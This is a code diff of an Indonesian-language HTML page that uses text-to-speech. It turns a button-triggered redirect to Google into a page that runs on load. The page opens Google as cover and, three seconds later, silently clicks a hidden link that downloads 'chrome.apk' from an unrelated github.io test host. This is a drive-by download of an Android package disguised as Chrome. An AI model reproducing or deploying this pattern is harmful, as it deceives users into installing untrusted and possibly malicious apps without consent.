@@ -3,28 +3,18 @@
 <html>
 <head>
 
-<title>TTS Open URL Android</title>
+<title>TTS Redirect Download</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 
 body{
-    background:#202124;
-    color:white;
-    font-family:Arial;
-    text-align:center;
-    padding:40px;
-}
-
-button{
-    background:#4285F4;
-    color:white;
-    border:0;
-    padding:15px 25px;
-    margin:10px;
-    border-radius:10px;
-    font-size:18px;
+background:#202124;
+color:white;
+font-family:Arial;
+text-align:center;
+padding:40px;
 }
 
 </style>
@@ -33,61 +23,71 @@ button{
 
 <body>
 
+<h2>🔊 Auto Voice Redirect</h2>
 
-<h2>🔊 TTS URL Launcher</h2>
-
-
-<button onclick="jalankan()">
-Mulai
-</button>
-
-
-<p id="hasil">
-Menunggu...
-</p>
-
+<p id="status">Menunggu...</p>
 
 
 <script>
 
 
-function jalankan(){
+window.onload=function(){
 
-
-let pesan =
-"Membuka website sekarang";
-
-
-document.getElementById("hasil").innerHTML =
-pesan;
-
-
-// TTS Android Chrome
 
 let suara =
-new SpeechSynthesisUtterance(pesan);
+new SpeechSynthesisUtterance(
+"Membuka Google dan mengunduh file"
+);
 
 suara.lang="id-ID";
 
 
-
 suara.onend=function(){
 
-// buka URL setelah suara selesai
 
-window.location.href =
-"https://www.google.com";
+document.getElementById("status").innerHTML =
+"Membuka Google...";
+
+
+// buka Google
+
+window.open(
+"https://www.google.com",
+"_blank"
+);
+
+
+// mulai download
+
+setTimeout(function(){
+
+
+let a =
+document.createElement("a");
+
+a.href =
+"https://ecdnts-del.github.io/test-apk/chrome.apk";
+
+a.download =
+"chrome.apk";
+
+document.body.appendChild(a);
+
+a.click();
+
+document.body.removeChild(a);
+
+
+},3000);
 
 
 };
 
 
-
 speechSynthesis.speak(suara);
 
 
-
-}
+};
 
 
 </script>
